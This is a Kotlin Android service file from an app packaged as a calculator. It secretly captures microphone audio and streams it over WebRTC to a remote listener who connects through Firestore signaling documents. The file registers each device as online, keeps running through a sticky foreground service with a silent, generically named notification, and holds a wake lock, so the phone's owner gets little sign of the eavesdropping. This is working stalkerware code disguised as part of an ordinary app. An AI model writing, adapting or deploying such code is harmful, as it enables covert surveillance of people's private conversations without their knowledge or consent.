package com.dp.calculator

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.*
import org.webrtc.*

class AudioService : Service() {

    companion object {
        const val ACTION_START = "ACTION_START"
        const val ACTION_STOP = "ACTION_STOP"
        private const val TAG = "AudioService"
        private const val NOTIFICATION_ID = 9999
        private const val CHANNEL_ID = "bg_service"
        private const val SAMPLE_RATE = 16000
    }

    private var audioRecord: AudioRecord? = null
    private var peerConnectionFactory: PeerConnectionFactory? = null
    private var peerConnection: PeerConnection? = null
    private var audioSource: AudioSource? = null
    private var audioTrack: AudioTrack? = null
    private var eglBase: EglBase? = null

    private var wakeLock: PowerManager.WakeLock? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isStreaming = false
    private val firestore = FirebaseFirestore.getInstance()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> startStreaming()
            ACTION_STOP -> stopStreaming()
        }
        return START_STICKY
    }

    private fun startStreaming() {
        if (isStreaming) return
        serviceScope.launch {
            try {
                acquireWakeLock()
                startForeground(NOTIFICATION_ID, createNotification())
                initWebRTC()
                startMicCapture()
                registerDevice()
                listenForSignaling()
                isStreaming = true
                Log.d(TAG, "Streaming started")
            } catch (e: Exception) {
                Log.e(TAG, "Start failed", e)
                stopStreaming()
            }
        }
    }

    private fun stopStreaming() {
        isStreaming = false
        audioTrack?.dispose(); audioTrack = null
        audioSource?.dispose(); audioSource = null
        audioRecord?.release(); audioRecord = null
        peerConnection?.close(); peerConnection = null
        peerConnectionFactory?.dispose(); peerConnectionFactory = null
        eglBase?.release(); eglBase = null
        releaseWakeLock()
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    private fun initWebRTC() {
        eglBase = EglBase.create()

        val initOpts = PeerConnectionFactory.InitializationOptions.builder(this)
            .setEnableInternalTracer(false)
            .createInitializationOptions()
        PeerConnectionFactory.initialize(initOpts)

        val encoderFactory = DefaultVideoEncoderFactory(eglBase!!.eglBaseContext, true, true)
        val decoderFactory = DefaultVideoDecoderFactory(eglBase!!.eglBaseContext)

        peerConnectionFactory = PeerConnectionFactory.builder()
            .setVideoEncoderFactory(encoderFactory)
            .setVideoDecoderFactory(decoderFactory)
            .createPeerConnectionFactory()

        val iceServers = listOf(
            PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer(),
            PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer()
        )

        val rtcConfig = PeerConnection.RTCConfiguration(iceServers).apply {
            sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
        }

        peerConnection = peerConnectionFactory!!.createPeerConnection(rtcConfig, object : PeerConnection.Observer {
            override fun onSignalingChange(s: PeerConnection.SignalingState?) {}
            override fun onIceConnectionChange(s: PeerConnection.IceConnectionState?) {}
            override fun onIceConnectionReceivingChange(r: Boolean) {}
            override fun onIceGatheringChange(s: PeerConnection.IceGatheringState?) {}
            override fun onIceCandidate(c: IceCandidate?) { c?.let { sendCandidateToFirestore(it) } }
            override fun onIceCandidatesRemoved(c: Array<out IceCandidate>?) {}
            override fun onAddStream(s: MediaStream?) {}
            override fun onRemoveStream(s: MediaStream?) {}
            override fun onDataChannel(dc: DataChannel?) {}
            override fun onRenegotiationNeeded() {}
            override fun onAddTrack(r: RtpReceiver?, s: Array<out MediaStream>?) {}
        })
    }

    private fun startMicCapture() {
        val bufSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT)
        audioRecord = AudioRecord(MediaRecorder.AudioSource.MIC, SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufSize)

        audioSource = peerConnectionFactory!!.createAudioSource(MediaConstraints())
        audioTrack = peerConnectionFactory!!.createAudioTrack("audio", audioSource)
        peerConnection?.addTrack(audioTrack, listOf("stream"))

        audioRecord?.startRecording()

        val deviceId = DeviceRegistrar.getDeviceId(this)
        serviceScope.launch(Dispatchers.IO) {
            val buf = ByteArray(3200)
            while (isStreaming && audioRecord?.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
                val read = audioRecord?.read(buf, 0, buf.size) ?: 0
                if (read > 0) {
                    // Audio is being captured; WebRTC sends automatically via the track
                }
            }
        }
    }

    private fun registerDevice() {
        val id = DeviceRegistrar.getDeviceId(this)
        firestore.collection("devices").document(id).set(hashMapOf(
            "deviceId" to id, "status" to "online", "timestamp" to System.currentTimeMillis()
        ))
    }

    private fun listenForSignaling() {
        val id = DeviceRegistrar.getDeviceId(this)
        firestore.collection("signaling").document(id)
            .addSnapshotListener { snap, e ->
                if (e != null || snap == null || !snap.exists()) return@addSnapshotListener
                val data = snap.data ?: return@addSnapshotListener
                val type = data["type"] as? String ?: return@addSnapshotListener

                when (type) {
                    "offer" -> {
                        val sdp = data["sdp"] as? String ?: return@addSnapshotListener
                        handleOffer(sdp, id)
                    }
                    "ice-candidate" -> {
                        val c = data["candidate"] as? String ?: return@addSnapshotListener
                        val mid = data["sdpMid"] as? String ?: return@addSnapshotListener
                        val idx = (data["sdpMLineIndex"] as? Number)?.toInt() ?: return@addSnapshotListener
                        peerConnection?.addIceCandidate(IceCandidate(mid, idx, c))
                    }
                }
            }
    }

    private fun handleOffer(sdpStr: String, deviceId: String) {
        serviceScope.launch {
            try {
                val offer = SessionDescription(SessionDescription.Type.OFFER, sdpStr)
                peerConnection?.setRemoteDescription(object : SdpObserver {
                    override fun onCreateSuccess(s: SessionDescription?) {}
                    override fun onCreateFailure(e: String?) {}
                    override fun onSetSuccess() {
                        val constraints = MediaConstraints().apply {
                            mandatory.add(MediaConstraints.KeyValuePair("OfferToReceiveAudio", "true"))
                        }
                        peerConnection?.createAnswer(object : SdpObserver {
                            override fun onCreateSuccess(ans: SessionDescription?) {
                                ans?.let { sd ->
                                    peerConnection?.setLocalDescription(object : SdpObserver {
                                        override fun onCreateSuccess(s: SessionDescription?) {}
                                        override fun onCreateFailure(e: String?) {}
                                        override fun onSetSuccess() {
                                            val ansData = hashMapOf(
                                                "type" to "answer",
                                                "sdp" to sd.description,
                                                "deviceId" to deviceId,
                                                "timestamp" to System.currentTimeMillis()
                                            )
                                            firestore.collection("signaling").document(deviceId)
                                                .collection("answers").add(ansData)
                                        }
                                        override fun onSetFailure(e: String?) { Log.e(TAG, "setLocal fail: $e") }
                                    }, sd)
                                }
                            }
                            override fun onCreateFailure(e: String?) { Log.e(TAG, "createAnswer fail: $e") }
                            override fun onSetSuccess() {}
                            override fun onSetFailure(e: String?) {}
                        }, constraints)
                    }
                    override fun onSetFailure(e: String?) { Log.e(TAG, "setRemote fail: $e") }
                }, offer)
            } catch (e: Exception) { Log.e(TAG, "handleOffer error", e) }
        }
    }

    private fun sendCandidateToFirestore(candidate: IceCandidate) {
        val id = DeviceRegistrar.getDeviceId(this)
        firestore.collection("signaling").document(id).collection("candidates").add(hashMapOf(
            "type" to "ice-candidate",
            "candidate" to candidate.sdp,
            "sdpMid" to candidate.sdpMid,
            "sdpMLineIndex" to candidate.sdpMLineIndex,
            "deviceId" to id,
            "timestamp" to System.currentTimeMillis()
        ))
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "Service", NotificationManager.IMPORTANCE_LOW).apply {
                setShowBadge(false); enableLights(false); enableVibration(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setSilent(true).setOngoing(true).build()
    }

    private fun acquireWakeLock() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Calc::WL").apply { acquire(60 * 60 * 1000L) }
    }

    private fun releaseWakeLock() { wakeLock?.let { if (it.isHeld) it.release() }; wakeLock = null }

    override fun onDestroy() { stopStreaming(); serviceScope.cancel(); super.onDestroy() }
}
